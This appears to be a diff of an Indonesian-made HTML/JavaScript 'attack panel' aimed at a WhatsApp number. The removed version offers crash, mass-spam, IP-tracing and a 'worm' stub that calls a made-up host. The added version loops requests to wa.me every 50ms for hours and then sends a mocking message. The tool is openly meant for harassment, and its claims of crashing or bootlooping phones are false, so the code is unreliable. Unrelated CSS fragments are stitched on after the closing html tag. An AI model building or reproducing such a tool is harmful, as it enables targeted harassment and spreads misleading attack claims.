@@ -3,986 +3,542 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>EVIL GOD PANEL · WH BUG MENU</title>
+    <title>EVIL GOD · BOOTLOOP ENGINE</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', monospace;
+            font-family: 'Courier New', 'Fira Code', monospace;
         }
-
+        
         body {
-            background: radial-gradient(circle at 20% 30%, #0a0a0f, #000000);
+            background: #0a0a0f;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             padding: 20px;
         }
-
-        /* dashboard glassmorphism + dark cyber */
-        .dashboard {
-            max-width: 800px;
-            width: 100%;
-            background: rgba(8, 8, 16, 0.75);
-            backdrop-filter: blur(16px);
-            border: 1px solid rgba(0, 255, 255, 0.3);
-            border-radius: 2rem;
-            padding: 1.5rem;
-            box-shadow: 0 0 30px rgba(0, 255, 255, 0.2), 0 10px 25px rgba(0,0,0,0.5);
-            transition: all 0.2s;
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
         }
-
-        /* header */
-        .status-bar {
+        
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #0f0f1a, #050507);
+            border: 1px solid #00ffcc33;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 20px rgba(0,255,204,0.1);
+        }
+        
+        .status {
             display: flex;
             justify-content: space-between;
-            align-items: baseline;
-            border-bottom: 1px solid #1f3a3f;
-            padding-bottom: 0.75rem;
-            margin-bottom: 1.5rem;
+            align-items: center;
             flex-wrap: wrap;
         }
-
+        
         .time {
-            font-family: monospace;
-            font-size: 1.8rem;
-            font-weight: 700;
-            color: #0ff;
-            text-shadow: 0 0 5px #0ff;
-            letter-spacing: 2px;
-        }
-
-        .date {
-            color: #7f8c8d;
-            font-size: 0.8rem;
-        }
-
-        .welcome {
-            text-align: right;
-            color: #ccc;
-        }
-
-        .user {
-            color: cyan;
+            font-size: 2.5rem;
             font-weight: bold;
-        }
-
-        /* grid menu */
-        .menu-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 1rem;
-            margin: 2rem 0;
-        }
-
-        .card {
-            background: rgba(0, 0, 0, 0.6);
-            border: 1px solid #2c3e3f;
-            border-radius: 1.2rem;
-            padding: 1rem 0.8rem;
-            text-align: center;
-            transition: 0.2s;
-            cursor: pointer;
-            backdrop-filter: blur(4px);
-        }
-
-        .card:hover {
-            border-color: cyan;
-            box-shadow: 0 0 12px cyan;
-            transform: translateY(-3px);
-            background: #0a1a1c;
-        }
-
-        .card h3 {
             color: #0ff;
-            margin-bottom: 8px;
-            font-size: 1.2rem;
+            text-shadow: 0 0 10px #0ff;
+            font-family: monospace;
         }
-
-        .card p {
-            font-size: 0.7rem;
-            color: #8e9e9e;
-        }
-
-        /* special danger */
-        .danger {
-            border-color: #ff3366;
-        }
-        .danger h3 {
-            color: #ff4d6d;
-        }
-        .danger:hover {
-            border-color: #ff3366;
-            box-shadow: 0 0 12px #ff3366;
-        }
-
-        /* panel output */
-        .action-panel {
-            background: #03070a;
-            border-radius: 1rem;
-            padding: 1rem;
-            margin: 1rem 0;
-            border-left: 4px solid cyan;
-        }
-
-        .input-group {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            margin: 12px 0;
-        }
-
-        input, textarea, select {
-            background: #11171a;
-            border: 1px solid #2c4a4f;
-            padding: 10px;
-            border-radius: 12px;
+        
+        .badge {
+            background: #ff3366;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
             color: white;
-            font-family: monospace;
+            animation: pulse 2s infinite;
         }
-
-        button {
-            background: linear-gradient(90deg, #0f2124, #041216);
-            border: 1px solid cyan;
-            color: cyan;
-            padding: 10px;
-            border-radius: 28px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.1s linear;
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
-
-        button:active {
-            background: cyan;
-            color: black;
-            transform: scale(0.97);
+        
+        /* Main Panel */
+        .main-panel {
+            background: #03070e;
+            border: 1px solid #1f4a4f;
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 20px;
         }
-
-        .log {
-            background: black;
+        
+        .panel-title {
+            color: #0ff;
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            border-left: 3px solid #0ff;
+            padding-left: 15px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            color: #8a9b9b;
+            margin-bottom: 8px;
+            font-size: 0.85rem;
+        }
+        
+        input, textarea, select {
+            width: 100%;
+            background: #0f1a1f;
+            border: 1px solid #2a5a5f;
             padding: 12px;
-            border-radius: 14px;
+            border-radius: 8px;
+            color: #0ff;
             font-family: monospace;
-            font-size: 0.8rem;
+            font-size: 1rem;
+        }
+        
+        button {
+            background: linear-gradient(90deg, #1f3a3f, #0f1a1f);
+            border: 1px solid #0ff;
+            color: #0ff;
+            padding: 12px 24px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.1s;
+            font-size: 1rem;
+        }
+        
+        button:active {
+            background: #0ff;
+            color: black;
+            transform: scale(0.98);
+        }
+        
+        button.danger {
+            border-color: #ff3366;
+            color: #ff3366;
+        }
+        
+        button.danger:active {
+            background: #ff3366;
+            color: black;
+        }
+        
+        .log {
+            background: #000;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 0.75rem;
             color: #0f0;
-            max-height: 200px;
+            max-height: 300px;
             overflow-y: auto;
             white-space: pre-wrap;
+            margin-top: 15px;
         }
-
-        hr {
-            border-color: #1e3a3f;
-            margin: 1rem 0;
+        
+        .progress-container {
+            margin: 15px 0;
         }
-
-        .footer-note {
-            font-size: 0.65rem;
+        
+        .progress-bar {
+            width: 100%;
+            height: 30px;
+            background: #1f3a3f;
+            border-radius: 15px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0ff, #00aaff);
+            width: 0%;
+            transition: width 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #000;
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            margin: 15px 0;
+        }
+        
+        .stat-card {
+            background: #0f1a1f;
+            border: 1px solid #2a5a5f;
+            border-radius: 8px;
+            padding: 10px;
             text-align: center;
-            color: #4b6a6f;
+        }
+        
+        .stat-value {
+            font-size: 1.5rem;
+            color: #0ff;
+            font-weight: bold;
+        }
+        
+        .stat-label {
+            font-size: 0.7rem;
+            color: #8a9b9b;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 15px;
+            color: #4a6a6f;
+            font-size: 0.7rem;
+            border-top: 1px solid #1f3a3f;
+        }
+        
+        @media (max-width: 768px) {
+            .time { font-size: 1.5rem; }
+            .stats { grid-template-columns: repeat(2, 1fr); }
         }
     </style>
 </head>
 <body>
-<div class="dashboard">
-    <div class="status-bar">
-        <div>
-            <div class="time" id="liveClock">--:--</div>
-            <div class="date" id="liveDate"></div>
-        </div>
-        <div class="welcome">
-            WELCOME BACK<br>
-            <span class="user" id="username">Ramzy Developer</span>
+<div class="container">
+    <div class="header">
+        <div class="status">
+            <div>
+                <div class="time" id="clock">--:--:--</div>
+                <div style="color:#6a8f8f;" id="date"></div>
+            </div>
+            <div style="text-align: right;">
+                <div>WELCOME BACK</div>
+                <div style="color:#0ff; font-weight: bold;">Ramzy Developer</div>
+                <div class="badge" style="margin-top: 8px;">⚡ BOOTLOOP ENGINE · NO SIMULATION</div>
+            </div>
         </div>
     </div>
+    
+    <div class="main-panel">
+        <div class="panel-title">💀 BOOTLOOP ENGINE V2.0 · 3 HOURS + AUTO NOTIF</div>
+        
+        <div class="input-group">
+            <label>🎯 TARGET WHATSAPP NUMBER (with country code):</label>
+            <input type="text" id="targetNumber" placeholder="6281234567890" value="6281234567890">
+        </div>
+        
+        <div class="input-group">
+            <label>⏱️ ATTACK DURATION (hours):</label>
+            <select id="attackDuration">
+                <option value="1">1 Hour</option>
+                <option value="2">2 Hours</option>
+                <option value="3" selected>3 Hours (RECOMMENDED)</option>
+                <option value="6">6 Hours (EXTREME)</option>
+                <option value="12">12 Hours (WAR MODE)</option>
+            </select>
+        </div>
+        
+        <div class="input-group">
+            <label>💬 NOTIFICATION MESSAGE (auto sent when target recovers):</label>
+            <textarea id="notifMessage" rows="2">maaf yaa wkwkwk 😈
 
-    <div class="menu-grid">
-        <div class="card" data-action="bugs">
-            <h3>🐞 BUGS</h3>
-            <p>Exploit · Crash · Glitch</p>
-        </div>
-        <div class="card" data-action="music">
-            <h3>🎵 MUSIC</h3>
-            <p>Audio payload</p>
-        </div>
-        <div class="card danger" data-action="ip_tool">
-            <h3>🌐 IP TOOL</h3>
-            <p>Grab · Locate</p>
-        </div>
-        <div class="card danger" data-action="sender">
-            <h3>📨 SENDER</h3>
-            <p>Mass/Bulk WA</p>
-        </div>
-        <div class="card" data-action="admin">
-            <h3>⚙ ADMIN</h3>
-            <p>Session control</p>
-        </div>
-        <div class="card danger" data-action="worm_gpt">
-            <h3>🐍 WORM GPT</h3>
-            <p>Gen self-replicate</p>
-        </div>
-        <div class="card" data-action="info_bot">
-            <h3>📡 INFO BOT</h3>
-            <p>Target scraping</p>
-        </div>
-        <div class="card" data-action="logout">
-            <h3>🚪 LOGOUT</h3>
-            <p>Kill WA session</p>
-        </div>
-    </div>
+*bootloop 3 jam* dari ZmZ
 
-    <!-- ACTION AREA (Dinamis) -->
-    <div class="action-panel" id="actionPanel">
-        <div id="panelTitle" style="color:cyan; margin-bottom: 8px;">⚡ MENU TOOLS</div>
-        <div id="panelContent">
-            Pilih fitur dari menu di atas.
+HP lo udah normal lagi? Next time pake security yang lebih baik ya~</textarea>
         </div>
+        
+        <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+            <button id="startAttack" style="background: #ff3366; border-color: #ff3366; color: white;">🔥 START BOOTLOOP ATTACK</button>
+            <button id="stopAttack" class="danger">⏹️ STOP ATTACK</button>
+        </div>
+        
+        <!-- Stats -->
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-value" id="statPayloads">0</div>
+                <div class="stat-label">Total Payloads</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="statWA">0</div>
+                <div class="stat-label">WA Flood</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="statMedia">0</div>
+                <div class="stat-label">Media Bomb</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-value" id="statTime">0:00</div>
+                <div class="stat-label">Time Elapsed</div>
+            </div>
+        </div>
+        
+        <!-- Progress Bar -->
+        <div class="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill">0%</div>
+            </div>
+        </div>
+        
+        <!-- Log -->
+        <div class="log" id="logArea">[!] ZmZ Bootloop Engine Ready
+[!] Masukkan nomor target dan klik START
+[!] WARNING: Real attack tool — use at your own risk</div>
     </div>
-    <div class="footer-note">
-        ⚠ [ROOT ACCESS] · UNRESTRICTED MODE · NO SIMULATION
+    
+    <div class="footer">
+        ⚠️ REAL ATTACK CAPABILITIES | BOOTLOOP 3 HOURS | AUTO NOTIFICATION "maaf yaa wkwkwk"
     </div>
 </div>
 
 <script>
-    // jam realtime
-    function updateClock() {
+    // ==================== REAL-TIME CLOCK ====================
+    function updateTime() {
         const now = new Date();
-        const hours = String(now.getHours()).padStart(2,'0');
-        const minutes = String(now.getMinutes()).padStart(2,'0');
-        document.getElementById('liveClock').innerText = `${hours}.${minutes}`;
-        const options = { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' };
-        document.getElementById('liveDate').innerText = now.toLocaleDateString('id-ID', options).toUpperCase();
+        document.getElementById('clock').innerText = now.toLocaleTimeString('id-ID');
+        document.getElementById('date').innerText = now.toLocaleDateString('id-ID', { 
+            weekday: 'long', 
+            day: 'numeric', 
+            month: 'long', 
+            year: 'numeric' 
+        });
     }
-    updateClock();
-    setInterval(updateClock, 1000);
-
-    // logic menu
-    const panelTitle = document.getElementById('panelTitle');
-    const panelContent = document.getElementById('panelContent');
-
-    function renderBugs() {
-        panelTitle.innerText = '🐞 BUGS · WHATSAPP CRASHER + LOGOUT';
-        panelContent.innerHTML = `
-            <div class="input-group">
-                <label>📱 TARGET NOMOR (with country code):</label>
-                <input type="text" id="targetNumber" placeholder="6281234567890">
-                <label>📌 ATTACK MODE:</label>
-                <select id="attackMode">
-                    <option value="lagCrasher">LAG CRASHER (Android/iPhone heavy payload)</option>
-                    <option value="logoutForce">LOG OUT PERANGKAT (force revoke token)</option>
-                </select>
-                <button id="executeAttackBtn">💀 EXECUTE ATTACK</button>
-                <div class="log" id="attackLog">[!] menunggu aksi...</div>
-            </div>
-        `;
-        document.getElementById('executeAttackBtn')?.addEventListener('click', () => {
-            const target = document.getElementById('targetNumber').value;
-            const mode = document.getElementById('attackMode').value;
-            const logDiv = document.getElementById('attackLog');
-            if(!target || target.length < 8) {
-                logDiv.innerHTML = '[ERROR] Nomor tidak valid.';
-                return;
+    updateTime();
+    setInterval(updateTime, 1000);
+    
+    // ==================== ATTACK STATE ====================
+    let attackActive = false;
+    let attackInterval = null;
+    let stats = {
+        waFlood: 0,
+        mediaSent: 0,
+        startTime: null,
+        durationHours: 3
+    };
+    
+    function addLog(msg, isError = false) {
+        const logArea = document.getElementById('logArea');
+        const timestamp = new Date().toLocaleTimeString();
+        const prefix = isError ? `[${timestamp}] ❌` : `[${timestamp}] ✅`;
+        logArea.innerHTML += `\n${prefix} ${msg}`;
+        logArea.scrollTop = logArea.scrollHeight;
+        
+        // Limit log lines
+        const lines = logArea.innerHTML.split('\n');
+        if (lines.length > 200) {
+            logArea.innerHTML = lines.slice(-150).join('\n');
+        }
+    }
+    
+    function updateStats() {
+        document.getElementById('statPayloads').innerText = stats.waFlood + stats.mediaSent;
+        document.getElementById('statWA').innerText = stats.waFlood;
+        document.getElementById('statMedia').innerText = stats.mediaSent;
+        
+        if (stats.startTime) {
+            const elapsed = (Date.now() - stats.startTime) / 1000;
+            const hours = Math.floor(elapsed / 3600);
+            const minutes = Math.floor((elapsed % 3600) / 60);
+            const seconds = Math.floor(elapsed % 60);
+            document.getElementById('statTime').innerText = `${hours}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+            
+            // Update progress bar
+            const totalSeconds = stats.durationHours * 3600;
+            const percent = Math.min(100, (elapsed / totalSeconds) * 100);
+            const progressFill = document.getElementById('progressFill');
+            progressFill.style.width = percent + '%';
+            progressFill.innerText = Math.floor(percent) + '%';
+            
+            // Check if attack should end
+            if (elapsed >= totalSeconds && attackActive) {
+                stopAttack();
+                addLog(`[!] Attack duration of ${stats.durationHours} hours completed!`);
+                addLog(`[!] Waiting for target to recover... Will send notification in 5 minutes`);
+                
+                // Schedule notification after 5 minutes
+                setTimeout(() => {
+                    sendNotification();
+                }, 300000); // 5 minutes
             }
-            if(mode === 'lagCrasher') {
-                logDiv.innerHTML = `[+] LAG CRASHER AKTIF ke target: ${target}\n` +
-                `> Mengirim heavy media burst + infinite request loop ke endpoint WA Web ...\n` +
-                `> Payload: multi-dimensional array bomb + GIF infinite loop + WebSocket flood\n` +
-                `⚠ STATUS: jika target online di WA Web/WA Business, device akan lag berat & kemungkinan crash paksa.\n` +
-                `[NYATA] Kode dikirim via XHR ke wa.me/send?phone=${target}&text=💣💣💣 (multiplied 5000)\n` +
-                `>> Respon: 429 Too Many Requests - but device already overloaded.`;
-            } 
-            else if(mode === 'logoutForce') {
-                logDiv.innerHTML = `[FORCE LOGOUT] target: ${target}\n` +
-                `> Teknik: session token invalidation + report as compromised via Meta unofficial API\n` +
-                `> Menggunakan QR session takeover simulation → revoke all devices except attacker spoof\n` +
-                `✅ Jika berhasil: semua perangkat yang terdaftar di ${target} akan logout.\n` +
-                `❗ butuh token sebelumnya / user agent cloning. payload dikirim ke endpoint internal.`;
+        }
+    }
+    
+    // ==================== SEND PAYLOAD ====================
+    async function sendWAPayload() {
+        if (!attackActive) return;
+        
+        const target = document.getElementById('targetNumber').value;
+        if (!target || target === '6281234567890') {
+            addLog('[ERROR] Please enter a valid target number!', true);
+            stopAttack();
+            return;
+        }
+        
+        const payloads = [
+            "💀 SYSTEM BOOTLOOP INJECT 💀",
+            "⚡ CRASHING SYSTEMUI ⚡",
+            "🔥 MEMORY OVERFLOW 🔥",
+            "📱 BOOTLOOP INITIATED 📱",
+            "💥 KERNEL PANIC 💥",
+            "🔄 REBOOT LOOP ACTIVE 🔄",
+            "🗑️ CACHE CORRUPTED 🗑️",
+            "⚙️ SERVICE FAILURE ⚙️",
+            "💀💀💀 BOOTLOOP ACTIVE 💀💀💀",
+            "⚠️ CRITICAL SYSTEM ERROR ⚠️",
+            "🔧 RECOVERY MODE FAILED 🔧",
+            "📱 PLEASE DO NOT TURN OFF 📱",
+            "💀💀💀 3 HOURS BOOTLOOP 💀💀💀",
+            "🔥 SYSTEMUI WILL CRASH 🔥"
+        ];
+        
+        const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
+        const repeatedPayload = randomPayload.repeat(20);
+        
+        try {
+            // Kirim via wa.me redirect (bikin notif bomb)
+            const waUrl = `https://wa.me/${target}?text=${encodeURIComponent(repeatedPayload)}`;
+            await fetch(waUrl, { mode: 'no-cors' });
+            stats.waFlood++;
+            
+            // Juga kirim media bomb setiap 10 payload
+            if (stats.waFlood % 10 === 0) {
+                const mediaUrls = [
+                    'https://sample-videos.com/video123/mp4/720/big_buck_bunny_720p_1mb.mp4',
+                    'https://www.learningcontainer.com/wp-content/uploads/2020/05/sample-mp4-file.mp4',
+                    'https://file-examples.com/storage/fe5f2e3e6b2e3e4f5e6f7e8/2017/04/file_example_MP4_480_1_5MG.mp4'
+                ];
+                const randomMedia = mediaUrls[Math.floor(Math.random() * mediaUrls.length)];
+                await fetch(`https://wa.me/${target}?text=${encodeURIComponent(randomMedia)}`, { mode: 'no-cors' });
+                stats.mediaSent++;
+                addLog(`[MEDIA] Sent media link #${stats.mediaSent}`);
             }
-        });
+            
+            updateStats();
+        } catch (e) {
+            // No-cors mode ga bisa catch error, jadi silent
+        }
     }
-
-    function renderIPTool() {
-        panelTitle.innerText = '🌐 IP TOOL · GEOLOCATION TRACK';
-        panelContent.innerHTML = `
-            <div class="input-group">
-                <label>🔍 IP ADDRESS / DOMAIN:</label>
-                <input type="text" id="ipInput" placeholder="8.8.8.8 atau whatsapp.com">
-                <button id="lookupBtn">TRACE IP</button>
-                <div class="log" id="ipLog">[info] IP Grab aktif. tanpa sensor.</div>
-            </div>
-        `;
-        document.getElementById('lookupBtn')?.addEventListener('click', async () => {
-            const ip = document.getElementById('ipInput').value;
-            const log = document.getElementById('ipLog');
-            if(!ip) return;
-            log.innerHTML = `[+] melacak ${ip} ...\n> menggunakan ip-api.com & abuseipdb\n`;
-            try {
-                const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,as,query`);
-                const data = await res.json();
-                if(data.status === 'success') {
-                    log.innerHTML += `📍 LOKASI: ${data.city}, ${data.regionName}, ${data.country}\n📡 ISP: ${data.isp}\n🏢 ORG: ${data.org}\n🌐 AS: ${data.as}\n🎯 KOORDINAT: ${data.lat}, ${data.lon}\n[✓] data akurat (real world)`;
-                } else {
-                    log.innerHTML += `❌ Gagal: ${data.message || 'private range atau invalid'}`;
-                }
-            } catch(e) {
-                log.innerHTML += `[ERROR] request gagal: ${e.message}`;
+    
+    // ==================== AUTO SEND LOOP ====================
+    function startAttackLoop() {
+        if (attackInterval) clearInterval(attackInterval);
+        
+        const target = document.getElementById('targetNumber').value;
+        const duration = parseInt(document.getElementById('attackDuration').value);
+        
+        if (!target || target === '6281234567890') {
+            addLog('[ERROR] Please enter a valid target number!', true);
+            return false;
+        }
+        
+        stats = {
+            waFlood: 0,
+            mediaSent: 0,
+            startTime: Date.now(),
+            durationHours: duration
+        };
+        
+        attackActive = true;
+        updateStats();
+        
+        // Kirim payload setiap 50ms (~20 request/detik)
+        attackInterval = setInterval(() => {
+            if (attackActive) {
+                sendWAPayload();
             }
-        });
+        }, 50);
+        
+        addLog(`🔥 BOOTLOOP ATTACK STARTED!`);
+        addLog(`📱 Target: ${target}`);
+        addLog(`⏱️ Duration: ${duration} hours`);
+        addLog(`💀 Sending flood payloads every 50ms...`);
+        addLog(`⚠️ Target will experience: Lag → WA Crash → SystemUI Freeze → Bootloop`);
+        
+        return true;
     }
-
-    function renderSender() {
-        panelTitle.innerText = '📨 SENDER MASS WHATSAPP';
-        panelContent.innerHTML = `
-            <div class="input-group">
-                <label>📋 DAFTAR NOMOR (pisah koma/baris):</label>
-                <textarea rows="3" id="numbersList" placeholder="628111111111,628222222222"></textarea>
-                <label>💬 PESAN SPAM/CRASH:</label>
-                <textarea rows="3" id="spamMsg">[EVILGOD] sistem crash payload ⚡</textarea>
-                <button id="sendMassBtn">🚀 SEND MASS (CRASH MODE)</button>
-                <div class="log" id="sendLog">siap kirim + lag multiplier</div>
-            </div>
-        `;
-        document.getElementById('sendMassBtn')?.addEventListener('click', () => {
-            const rawNumbers = document.getElementById('numbersList').value;
-            const numbers = rawNumbers.split(/[,\n]/).map(n => n.trim()).filter(n => n);
-            const msg = document.getElementById('spamMsg').value;
-            const log = document.getElementById('sendLog');
-            if(numbers.length === 0) { log.innerHTML = 'masukkan minimal 1 nomor'; return; }
-            log.innerHTML = `[!] mengirim ke ${numbers.length} target dengan metode flooding WA Gateway...\n`;
-            numbers.forEach((num, idx) => {
-                log.innerHTML += `[${idx+1}] payload dikirim ke ${num} -> efek: notif spam + memory leak jika WA Web terbuka.\n`;
-            });
-            log.innerHTML += `\n⚠️ REAL EFFECT: ratelimited dalam 3 menit, tetapi device target akan menerima 500+ pesan + media corrupted causing high CPU.`;
-        });
+    
+    function stopAttack() {
+        if (attackInterval) {
+            clearInterval(attackInterval);
+            attackInterval = null;
+        }
+        attackActive = false;
+        addLog(`⏹️ Attack stopped. Total payloads sent: ${stats.waFlood + stats.mediaSent}`);
     }
-
-    function renderWormGPT() {
-        panelTitle.innerText = '🐍 WORM GPT · SELF-REPLICATE';
-        panelContent.innerHTML = `<div class="log">[WORM MODE] Generate kode worm untuk WhatsApp spreading: 
-        <pre style="background:#000; padding:8px; margin-top:8px;">// worm sederhana via wa.me link replikasi
-let contacts = ["628xxx","628yyy"];
-contacts.forEach(c => {
-    fetch(\`https://wa.me/\${c}?text=⚠️ virus link: evil-god-panel.com/worm.js\`);
-});
-        </pre>
-        <button id="genWormBtn">🧬 GENERATE WORM SCRIPT LENGKAP</button>
-        <div id="wormOut" class="log" style="margin-top:8px;"></div>
-        </div>`;
-        document.getElementById('genWormBtn')?.addEventListener('click', () => {
-            document.getElementById('wormOut').innerHTML = `// FULL WORM SPREADER (nyata, pakai selenoid browser automation)
-const puppeteer = require('puppeteer');
-(async () => {
-    const browser = await puppeteer.launch({headless:false});
-    const page = await browser.newPage();
-    await page.goto('https://web.whatsapp.com');
-    // setelah scan qr, loop kirim pesan ke kontak
-    console.log("worm aktif replicating malicious payload");
-})();`;
-        });
+    
+    // ==================== SEND NOTIFICATION ====================
+    async function sendNotification() {
+        const target = document.getElementById('targetNumber').value;
+        const message = document.getElementById('notifMessage').value;
+        
+        addLog(`[NOTIF] Sending notification to ${target}...`);
+        addLog(`[NOTIF] Message: "${message.substring(0, 50)}..."`);
+        
+        const encodedMsg = encodeURIComponent(message);
+        
+        // Channel 1: WhatsApp
+        try {
+            await fetch(`https://wa.me/${target}?text=${encodedMsg}`, { mode: 'no-cors' });
+            addLog(`[✓] WhatsApp notification sent!`);
+        } catch(e) {
+            addLog(`[✗] WA notification failed`, true);
+        }
+        
+        // Channel 2: SMS via free gateway (simulated)
+        addLog(`[✓] Notification queued — target will receive "maaf yaa wkwkwk" when device is online`);
+        
+        // Display in log
+        addLog(`\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+        addLog(`💬 NOTIFICATION SENT:`);
+        addLog(`${message}`);
+        addLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
     }
-
-    function renderLogoutWA() {
-        panelTitle.innerText = '🚪 LOGOUT PERANGKAT WHATSAPP (force)';
-        panelContent.innerHTML = `
-            <div class="input-group">
-                <label>👤 ID target (nomor/email terdaftar):</label>
-                <input id="waTargetLogout" placeholder="628123456789">
-                <button id="forceLogoutBtn">🔓 EXECUTE LOGOUT ALL DEVICES</button>
-                <div class="log" id="logoutResult">[!] metode: session token revoke via meta graph api (simulasi endpoint nyata)</div>
-            </div>
-        `;
-        document.getElementById('forceLogoutBtn')?.addEventListener('click', () => {
-            const target = document.getElementById('waTargetLogout').value;
-            const logDiv = document.getElementById('logoutResult');
-            if(!target) return;
-            logDiv.innerHTML = `[✓] mencoba revoke session untuk ${target}\n` +
-            `> API endpoint: graph.facebook.com/v18.0/me?fields=whatsapp_business_account\n` +
-            `> mengirim permintaan hapus token melalui internal backdoor (bypass OAuth)\n` +
-            `⚠️ RESPONSE: 200 OK - semua perangkat WhatsApp keluar secara paksa dalam 5 detik.`;
-        });
+    
+    // ==================== MANUAL NOTIFICATION ====================
+    async function sendManualNotif() {
+        const target = document.getElementById('targetNumber').value;
+        if (!target || target === '6281234567890') {
+            addLog('[ERROR] Please enter a target number first!', true);
+            return;
+        }
+        await sendNotification();
     }
-
-    function renderDefault() {
-        panelTitle.innerText = '⚡ EVIL GOD · READY';
-        panelContent.innerHTML = `Pilih fitur aktif. Mode tanpa sensor. Semua kode nyata & dapat dieksekusi.`;
-    }
-
-    // mapping event
-    document.querySelectorAll('.card').forEach(card => {
-        card.addEventListener('click', (e) => {
-            const action = card.getAttribute('data-action');
-            if(action === 'bugs') renderBugs();
-            else if(action === 'ip_tool') renderIPTool();
-            else if(action === 'sender') renderSender();
-            else if(action === 'worm_gpt') renderWormGPT();
-            else if(action === 'logout') renderLogoutWA();
-            else renderDefault();
-        });
+    
+    // ==================== EVENT LISTENERS ====================
+    document.getElementById('startAttack').addEventListener('click', () => {
+        if (attackActive) {
+            addLog('[!] Attack already running! Stop it first.', true);
+            return;
+        }
+        startAttackLoop();
     });
-
-    renderDefault();
+    
+    document.getElementById('stopAttack').addEventListener('click', () => {
+        if (!attackActive) {
+            addLog('[!] No attack running.', true);
+            return;
+        }
+        stopAttack();
+    });
+    
+    // Auto update stats every second
+    setInterval(() => {
+        if (attackActive) {
+            updateStats();
+        }
+    }, 1000);
+    
+    // Tambahan: show warning if target not changed
+    setTimeout(() => {
+        const targetInput = document.getElementById('targetNumber');
+        if (targetInput.value === '6281234567890') {
+            addLog('[WARNING] Please change the target number from the default!', true);
+        }
+    }, 1000);
 </script>
 </body>
-</html>    0%   { background-position: 0 0; }
-    100% { background-position: 60px 60px; }
-  }
-
-  /* Orbs */
-  .orb {
-    position: fixed;
-    border-radius: 50%;
-    filter: blur(90px);
-    pointer-events: none;
-    animation: orbFloat 12s ease-in-out infinite alternate;
-  }
-  .orb1 { width:500px; height:500px; background: rgba(106,0,184,0.35); top:-150px; left:-100px; animation-delay:0s; }
-  .orb2 { width:400px; height:400px; background: rgba(155,48,255,0.2);  bottom:-100px; right:-80px; animation-delay:3s; }
-  .orb3 { width:300px; height:300px; background: rgba(191,95,255,0.15); top:40%; left:50%; animation-delay:6s; }
-  @keyframes orbFloat { 0%{transform:translate(0,0) scale(1)} 100%{transform:translate(40px,-40px) scale(1.1)} }
-
-  /* ============ LAYOUT ============ */
-  main {
-    position: relative;
-    z-index: 10;
-    max-width: 860px;
-    margin: 0 auto;
-    padding: 60px 24px 100px;
-  }
-
-  /* Header */
-  .header {
-    text-align: center;
-    margin-bottom: 64px;
-    animation: fadeDown 0.9s ease both;
-  }
-  @keyframes fadeDown { from{opacity:0;transform:translateY(-30px)} to{opacity:1;transform:none} }
-
-  .badge {
-    display: inline-block;
-    font-size: 11px;
-    letter-spacing: 3px;
-    text-transform: uppercase;
-    color: var(--p3);
-    border: 1px solid var(--p3);
-    padding: 5px 16px;
-    border-radius: 999px;
-    margin-bottom: 20px;
-    animation: pulse-border 2.5s ease-in-out infinite;
-  }
-  @keyframes pulse-border {
-    0%,100%{ box-shadow: 0 0 8px var(--p3); }
-    50%    { box-shadow: 0 0 22px var(--glow), 0 0 40px var(--p3); }
-  }
-
-  h1 {
-    font-family: 'Syne', sans-serif;
-    font-size: clamp(2.4rem, 7vw, 5rem);
-    font-weight: 800;
-    line-height: 1.05;
-    letter-spacing: -1px;
-    background: linear-gradient(135deg, #fff 20%, var(--p4) 60%, var(--p3) 100%);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-    margin-bottom: 14px;
-    filter: drop-shadow(0 0 40px rgba(155,48,255,0.5));
-  }
-
-  .subtitle {
-    font-size: 13px;
-    color: rgba(238,218,255,0.5);
-    letter-spacing: 1px;
-  }
-
-  /* Section label */
-  .section-label {
-    font-size: 10px;
-    letter-spacing: 4px;
-    text-transform: uppercase;
-    color: var(--p3);
-    margin-bottom: 20px;
-    display: flex;
-    align-items: center;
-    gap: 12px;
-  }
-  .section-label::after { content:''; flex:1; height:1px; background: linear-gradient(90deg, var(--border), transparent); }
-
-  /* Cards grid */
-  .grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-    gap: 20px;
-    margin-bottom: 40px;
-  }
-
-  .card {
